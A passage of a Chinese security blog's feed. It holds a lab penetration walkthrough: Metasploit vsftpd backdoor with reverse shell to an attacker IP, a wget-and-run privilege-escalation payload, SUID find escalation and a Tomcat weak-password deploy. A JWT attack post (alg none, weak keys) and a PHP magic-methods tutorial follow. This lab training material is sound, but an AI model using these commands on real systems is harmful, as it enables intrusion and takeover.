class="line">10</span><br></pre></td><td class="code"><pre><span class="line">set RHOSTS 目标IP</span><br><span class="line"></span><br><span class="line">set RPORT 21 #vsftpd 默认端口为 21</span><br><span class="line"></span><br><span class="line">set payload cmd/unix/reverse</span><br><span class="line"></span><br><span class="line">set LHOST 攻击机IP</span><br><span class="line"></span><br><span class="line">set LPORT 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635475798-ac9f29c2-46de-4553-813a-6c2af12b2d36.png" alt="null"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id # 若显示 uid=0(root)，则已获取 root 权限</span><br></pre></td></tr></table></figure><p><strong>查看系统信息，寻找提权漏洞</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/os-release # 查看系统版本 </span><br><span class="line">uname -r # 查看内核版本</span><br></pre></td></tr></table></figure><p>提权<br><strong>利用内核漏洞提权（示例：脏牛漏洞，适用于特定内核版本）</strong><br>在攻击机生成提权脚本（需对应目标架构，如 x86&#x2F;x64）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/exec CMD=&quot;/bin/sh&quot; -f elf &gt; dirtycow.elf</span><br></pre></td></tr></table></figure><p>在目标会话中下载并执行（攻击机需开启 HTTP 服务，如 <code>python3 -m http.server 80</code>）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 目标 shell 中操作</span><br><span class="line">wget http://攻击机IP:80/dirtycow.elf   # 下载提权程序</span><br><span class="line">chmod +x dirtycow.elf                 # 赋予执行权限</span><br><span class="line">./dirtycow.elf                        # 执行提权，成功后会获得 root shell</span><br></pre></td></tr></table></figure><p><strong>利用 SUID 程序提权</strong><br>查找具有 SUID 权限的危险程序（如 <code>find</code>、<code>bash</code> 等）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/null # 列出所有 SUID 程序 # 若存在可利用程序，例如 find： find / -exec /bin/sh \; -quit # 通过 find 执行 shell 获取 root</span><br></pre></td></tr></table></figure><p>vsftpd 2.3.4 后门的典型特征是触发后在目标 6200 端口开放 shell，Metasploit 模块会自动连接该端口并反弹会话。</p><h2 id="端口3：1524——-ingrelock-backdoor"><a href="#端口3：1524——-ingrelock-backdoor" class="headerlink" title="端口3：1524——-ingrelock_backdoor"></a>端口3：<strong>1524——-ingrelock_backdoor</strong></h2><p>利用telnet连接1524，直接返回root会话<br>端口3、<strong>1524——-ingrelock_backdoor</strong></p><p>利用telnet连接1524，直接返回root会话</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635475880-a2eb5e93-c4ce-4b6a-a304-fdfdd3c8c850.png" alt="null"></p><h2 id="端口4：1099——-distcc程序漏洞—-ingrelock"><a href="#端口4：1099——-distcc程序漏洞—-ingrelock" class="headerlink" title="端口4：1099——-distcc程序漏洞—-ingrelock"></a>端口4：1099——-distcc程序漏洞—-ingrelock</h2><p>利用metasploit</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635475929-275d20d2-2cff-4a30-8609-485c5cb60d32.png" alt="null"></p><p>返回对话</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635475990-5cdd3736-5f32-4dde-b307-eb28786fd63d.png" alt="null"></p><h2 id="端口5：139——-samba为3-0漏洞"><a href="#端口5：139——-samba为3-0漏洞" class="headerlink" title="端口5：139——-samba为3.0漏洞"></a>端口5：139——-samba为3.0漏洞</h2><p>先用nmap进行详细扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -A -T4 192.168.195.133</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635476051-e803edc1-c7c5-49b2-b871-94ef96447e72.png" alt="null"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635476100-15179c6b-02cf-483e-bf89-ef9eef07f6e8.png" alt="null"></p><p>metasploit有众多扫描模块，以适应不同的需要。在metasploit中同样可以使用nmap进行扫描。在命令行中直接键入指令即可。</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635476161-24c7b9f7-2b86-42c3-9ce8-fffe7adf6d4a.png" alt="null"></p><p> <img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635476219-18726041-7bc5-4639-8438-f0e03ea55485.png" alt="null"></p><p>Samba</p><p>利用metasploit</p><p> <img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635476272-fbd8eee0-6687-4778-a82f-a13267f48b6f.png" alt="null"></p><p> <img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635476322-76de2766-2390-4210-90b4-62b61b4cb36d.png" alt="null"></p><p> <img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635476373-843e368f-5f54-4a44-a114-6b4443bcd7af.png" alt="null"></p><h2 id="端口6、8180——-Apache-Tomcat弱口令"><a href="#端口6、8180——-Apache-Tomcat弱口令" class="headerlink" title="端口6、8180——-Apache Tomcat弱口令"></a>端口6、8180——-Apache Tomcat弱口令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">在终端中输入命令“nmap 172.20.10.3”，对目标主机进行端口扫描，发现开放8180端口并且运行着ApacheTomcat/CoyoteJSP engine1.1。</span><br><span class="line">在终端中输入命令“msfconsole”，启动MSF终端。</span><br><span class="line">在终端下输入命令“search tomcat”, 搜索tomcat的相关工具和攻击载荷。</span><br><span class="line">在终端输入“use auxiliary/scanner/http/tomcat_mgr_login”， 启用漏洞利用模块, 提示符就会提示进入到该路径下。</span><br><span class="line">在终端下输入“set RHOSTS 172.20.10.3”,设置攻击目标主机IP。</span><br><span class="line">在终端下输入“set RPORT 8180”,设置攻击目标主机端口号.</span><br><span class="line">在终端下输入“exploit”, 实施攻击。获得用户名tomcat,密码tomcat。</span><br><span class="line">在终端下输入“use exploit/multi/http/tomcat_mgr_deploy”, 启用漏洞利用模块, 提示符就会提示进入到该路径下。</span><br><span class="line">在终端下输入“set RHOST 172.20.10.3”,设置攻击的目标主机IP。</span><br><span class="line">在终端下输入“set RPORT 8180”,设置攻击的目标主机端口号。</span><br><span class="line">在终端下输入“set username tomcat”,设置攻击时使用的登录账号tomcat。</span><br><span class="line">在终端下输入“set userpassword tomcat”,设置攻击时使用的密码tomcat。</span><br><span class="line">在终端下输入“exploit”,开始攻击，建立会话。</span><br><span class="line">在终端下输入“getuid”,查看获取的用户权限。</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635476422-2b3c6753-c901-41bb-b717-b6b944272aea.png" alt="null"></p><p>得到用户名密码分别为tomcat，tomcat</p><p>上面不成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set HttpUsername tomcat</span><br><span class="line">set HttpPassword tomcat</span><br></pre></td></tr></table></figure><p>可能版本太老了，tomcat已经做出防护了</p><h2 id="端口7、80——-PHP-CGI参数注入执行漏洞"><a href="#端口7、80——-PHP-CGI参数注入执行漏洞" class="headerlink" title="端口7、80——-PHP CGI参数注入执行漏洞"></a>端口7、80——-PHP CGI参数注入执行漏洞</h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635476483-52503aeb-9bfc-43da-a88f-7d32e920d61f.png" alt="null"></p><h1 id="网站渗透"><a href="#网站渗透" class="headerlink" title="网站渗透"></a>网站渗透</h1><p>前面不是dirsearch扫出来，phpinfo和tikiwi吗<br>这里我们就对这两个域名进行操作<br><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635476535-26c0dcb3-d868-4ee5-b351-d01482b9aaa0.png" alt="null"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![](https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635476602-85919f53-59fc-46d5-a201-15752a43b7e4.png)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;内网&lt;/p&gt;</summary>
    
    
    
    <category term="内网安全" scheme="https://flypigc.github.io/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="内网打靶" scheme="https://flypigc.github.io/tags/%E5%86%85%E7%BD%91%E6%89%93%E9%9D%B6/"/>
    
  </entry>
  
  <entry>
    <title>JWT</title>
    <link href="https://flypigc.github.io/2025/12/11/jwt/"/>
    <id>https://flypigc.github.io/2025/12/11/jwt/</id>
    <published>2025-12-11T07:06:49.642Z</published>
    <updated>2025-12-20T02:07:23.480Z</updated>
    
    <content type="html"><![CDATA[<p>JWT</p><span id="more"></span><p>攻击 JWT，常用三种手法：未校验签名、禁用哈希、暴破弱密钥。</p><p><strong>未校验签名</strong>： 某些服务端并未校验 JWT 签名，所以，尝试修改 token 后直接发给服务端，查看结果。于是，将 user 字段值从 admin123 改为 admin 后，重新生成新 token：<br><a href="https://www.json.cn/jwt">jwt在线解密&#x2F;加密 - JSON中文网</a><br><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765436802475-d938ef87-eaf8-4648-a703-a371c35756bb.png" alt="img"></p><p>直接把username改成admin再去编码<br>发现500错误</p><p>继续下一个攻击</p><p>禁用哈希。JWT 第一部分含有 alg 字段，该字段指定生成签名采用哪种哈希算法，该站使用的是 HS256，可将该字段篡改为none，某些 JWT 的实现，一旦发现 alg 为 none，将不再生成哈希签名，自然不存在校验签名一说</p><p><a href="https://jwt.io/#debugger%E5%B0%86">https://jwt.io/#debugger将</a> alg 为 none 视为恶意行为，所以，无法通过在线工具生成 JWT：<br><img src="/Pasted%20image%2020250817191905.png" alt="null"></p><p>所以直接使用 python的 pyjwt库<br><img src="/Pasted%20image%2020250817191918.png" alt="null"><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765436780840-d41a3e92-4623-4172-9c36-1480c4017981.png" alt="img"></p><p>用 none 算法生成的 JWT 只有两部分了，根本连签名都没生成。将新的 token 发给服务端</p><p><img src="/media/2029717-20200721165012458-246328338.png" alt="null"><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765436793527-b98c2f66-11ea-4169-bf5f-d45dc98407f6.png" alt="img"></p><p>依旧500错误</p><p>暴破弱密钥。</p><p>在GitHub上面找到一个py脚本<a href="https://github.com/Ch1ngg/JWTPyCrack">https://github.com/Ch1ngg/JWTPyCrack</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;JWT&lt;/p&gt;</summary>
    
    
    
    <category term="web安全" scheme="https://flypigc.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="web安全" scheme="https://flypigc.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>PHP魔术方法</title>
    <link href="https://flypigc.github.io/2025/12/11/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/"/>
    <id>https://flypigc.github.io/2025/12/11/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/</id>
    <published>2025-12-11T07:03:45.592Z</published>
    <updated>2025-12-20T01:53:41.516Z</updated>
    
    <content type="html"><![CDATA[<p>PHP魔术方法</p><span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>PHP中把以两个下划线__开头的方法称为魔术方法(Magic methods)，这些方法在PHP中充当了举足轻重的作用。 魔术方法包括：</p><ol><li>__construct()，类的构造函数</li><li>__destruct()，类的析构函数</li><li>__call()，在对象中调用一个不可访问方法时调用</li><li>__callStatic()，用静态方式中调用一个不可访问方法时调用</li><li>__get()，获得一个类的成员变量时调用</li><li>__set()，设置一个类的成员变量时调用</li><li>__isset()，当对不可访问属性调用isset()或empty()时调用</li><li>__unset()，当对不可访问属性调用unset()时被调用。</li><li>__sleep()，执行serialize()时，先会调用这个函数</li><li>__wakeup()，执行unserialize()时，先会调用这个函数</li><li>__toString()，类被当成字符串时的回应方法</li><li>__invoke()，调用函数的方式调用一个对象时的回应方法</li><li>__set_state()，调用var_export()导出类时，此静态方法会被调用。</li><li>__clone()，当对象复制完成时调用</li><li>__autoload()，尝试加载未定义的类</li><li>__debugInfo()，打印所需调试信息</li></ol><h2 id="范例"><a href="#范例" class="headerlink" title="范例"></a>范例</h2><p>下面让我们以实例的形式向大家讲解下这几个魔术方法时如何使用的。</p><h3 id="一、-construct-，类的构造函数"><a href="#一、-construct-，类的构造函数" class="headerlink" title="一、 __construct()，类的构造函数"></a>一、 __construct()，类的构造函数</h3><p>php中构造方法是对象创建完成后第一个被对象自动调用的方法。在每个类中都有一个构造方法，如果没有显示地声明它，那么类中都会默认存在一个没有参数且内容为空的构造方法。</p><p>1、 构造方法的作用</p><p>通常构造方法被用来执行一些有用的初始化任务，如对成员属性在创建对象时赋予初始值。</p><p>2、 构造方法的在类中的声明格式</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">__constrct</span>(<span class="params">[参数列表]</span>)&#123;</span><br><span class="line"></span><br><span class="line">    方法体 <span class="comment">//通常用来对成员属性进行初始化赋值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3、 在类中声明构造方法需要注意的事项</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、在同一个类中只能声明一个构造方法，原因是，PHP不支持构造函数重载。</span><br><span class="line"></span><br><span class="line">2、构造方法名称是以两个下画线开始的__construct()</span><br></pre></td></tr></table></figure><p>下面是它的例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class">    </span>&#123;                                                                      </span><br><span class="line">            <span class="keyword">public</span> <span class="variable">$name</span>;        </span><br><span class="line">            <span class="keyword">public</span> <span class="variable">$age</span>;        </span><br><span class="line">            <span class="keyword">public</span> <span class="variable">$sex</span>;        </span><br><span class="line">                                                                 </span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 显示声明一个构造方法且带参数</span></span><br><span class="line"><span class="comment">         */</span>                                                                                       </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>=<span class="string">&quot;&quot;</span>, <span class="variable">$sex</span>=<span class="string">&quot;男&quot;</span>, <span class="variable">$age</span>=<span class="number">27</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;      </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;sex = <span class="variable">$sex</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * say 方法</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;我叫：&quot;</span> . <span class="variable language_">$this</span>-&gt;name . <span class="string">&quot;，性别：&quot;</span> . <span class="variable language_">$this</span>-&gt;sex . <span class="string">&quot;，年龄：&quot;</span> . <span class="variable language_">$this</span>-&gt;age;</span><br><span class="line">        &#125;   </span><br><span class="line">                                                                                           </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>创建对象$Person1且不带任参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$Person1</span> = <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$Person1</span>-&gt;<span class="title function_ invoke__">say</span>(); <span class="comment">//输出:我叫：，性别：男，年龄：27</span></span><br></pre></td></tr></table></figure><p>创建对象$Person2且带参数“小明”</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$Person2</span> = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;小明&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$Person2</span>-&gt;<span class="title function_ invoke__">say</span>(); <span class="comment">//输出：我叫：张三，性别：男，年龄：27</span></span><br></pre></td></tr></table></figure><p>创建对象$Person3且带三个参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$Person3</span> = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;李四&quot;</span>,<span class="string">&quot;男&quot;</span>,<span class="number">25</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$Person3</span>-&gt;<span class="title function_ invoke__">say</span>(); <span class="comment">//输出：我叫：李四，性别：男，年龄：25</span></span><br></pre></td></tr></table></figure><h3 id="二、-destruct-，类的析构函数"><a href="#二、-destruct-，类的析构函数" class="headerlink" title="二、__destruct()，类的析构函数"></a>二、__destruct()，类的析构函数</h3><p>通过上面的讲解，现在我们已经知道了什么叫构造方法。那么与构造方法对应的就是析构方法。</p><p>析构方法允许在销毁一个类之前执行的一些操作或完成一些功能，比如说关闭文件、释放结果集等。</p><p>析构方法是PHP5才引进的新内容。</p><p>析造方法的声明格式与构造方法 <code>__construct()</code> 比较类似，也是以两个下划线开始的方法 <code>__destruct()</code> ，这种析构方法名称也是固定的。</p><p>1、 析构方法的声明格式</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">__destruct</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line"> <span class="comment">//方法体</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：析构函数不能带有任何参数。</p><p>2、 析构方法的作用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一般来说，析构方法在PHP中并不是很常用，它属类中可选择的一部分，通常用来完成一些在对象销毁前的清理任务。</span><br></pre></td></tr></table></figure><p>举例演示，如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;     </span><br><span class="line">                                                        </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;         </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;         </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span>;         </span><br><span class="line">                                                                    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>=<span class="string">&quot;&quot;</span>, <span class="variable">$sex</span>=<span class="string">&quot;男&quot;</span>, <span class="variable">$age</span>=<span class="number">22</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sex  = <span class="variable">$sex</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age  = <span class="variable">$age</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * say 说话方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我叫：&quot;</span>.<span class="variable language_">$this</span>-&gt;name.<span class="string">&quot;，性别：&quot;</span>.<span class="variable language_">$this</span>-&gt;sex.<span class="string">&quot;，年龄：&quot;</span>.<span class="variable language_">$this</span>-&gt;age;</span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 声明一个析构方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;我觉得我还可以再抢救一下，我的名字叫&quot;</span>.<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$Person</span> = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;小明&quot;</span>);</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$Person</span>); <span class="comment">//销毁上面创建的对象$Person</span></span><br></pre></td></tr></table></figure><p>上面的程序运行时输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我觉得我还可以再抢救一下，我的名字叫小明</span><br></pre></td></tr></table></figure><h3 id="三、-call-，在对象中调用一个不可访问方法时调用。"><a href="#三、-call-，在对象中调用一个不可访问方法时调用。" class="headerlink" title="三、 __call()，在对象中调用一个不可访问方法时调用。"></a>三、 __call()，在对象中调用一个不可访问方法时调用。</h3><p>该方法有两个参数，第一个参数 <code>$function_name</code> 会自动接收不存在的方法名，第二个 <code>$arguments</code> 则以数组的方式接收不存在方法的多个参数。</p><p>1、 __call() 方法的格式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$function_name</span>, <span class="keyword">array</span> <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 方法体</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、 __call() 方法的作用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">为了避免当调用的方法不存在时产生错误，而意外的导致程序中止，可以使用 __call() 方法来避免。</span><br><span class="line"></span><br><span class="line">该方法在调用的方法不存在时会自动调用，程序仍会继续执行下去。</span><br></pre></td></tr></table></figure><p>请参考如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;                             </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">                              </span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;Hello, world!&lt;br&gt;&quot;</span>; </span><br><span class="line">    &#125;      </span><br><span class="line">        </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 声明此方法用来处理调用对象中不存在的方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$funName</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;你所调用的函数：&quot;</span> . <span class="variable">$funName</span> . <span class="string">&quot;(参数：&quot;</span> ;  <span class="comment">// 输出调用不存在的方法名</span></span><br><span class="line">          <span class="title function_ invoke__">print_r</span>(<span class="variable">$arguments</span>); <span class="comment">// 输出调用不存在的方法时的参数列表</span></span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;)不存在！&lt;br&gt;\n&quot;</span>; <span class="comment">// 结束换行                      </span></span><br><span class="line">    &#125;                                          </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$Person</span> = <span class="keyword">new</span> <span class="title class_">Person</span>();            </span><br><span class="line"><span class="variable">$Person</span>-&gt;<span class="title function_ invoke__">run</span>(<span class="string">&quot;teacher&quot;</span>); <span class="comment">// 调用对象中不存在的方法，则自动调用了对象中的__call()方法</span></span><br><span class="line"><span class="variable">$Person</span>-&gt;<span class="title function_ invoke__">eat</span>(<span class="string">&quot;小明&quot;</span>, <span class="string">&quot;苹果&quot;</span>);             </span><br><span class="line"><span class="variable">$Person</span>-&gt;<span class="title function_ invoke__">say</span>();                        </span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">你所调用的函数：<span class="title function_">run</span>(参数：<span class="title class_">Array</span> ( [<span class="number">0</span>] =&gt; teacher ) )不存在！</span><br><span class="line"></span><br><span class="line">你所调用的函数：<span class="title function_">eat</span>(参数：<span class="title class_">Array</span> ( [<span class="number">0</span>] =&gt; 小明 [<span class="number">1</span>] =&gt; 苹果 ) )不存在！</span><br><span class="line"></span><br><span class="line"><span class="title class_">Hello</span>, world!</span><br></pre></td></tr></table></figure><h3 id="四、-callStatic-，用静态方式中调用一个不可访问方法时调用"><a href="#四、-callStatic-，用静态方式中调用一个不可访问方法时调用" class="headerlink" title="四、 __callStatic()，用静态方式中调用一个不可访问方法时调用"></a>四、 __callStatic()，用静态方式中调用一个不可访问方法时调用</h3><p>此方法与上面所说的 __call() 功能除了 __callStatic() 是未静态方法准备的之外，其它都是一样的。</p><p>请看下面代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span 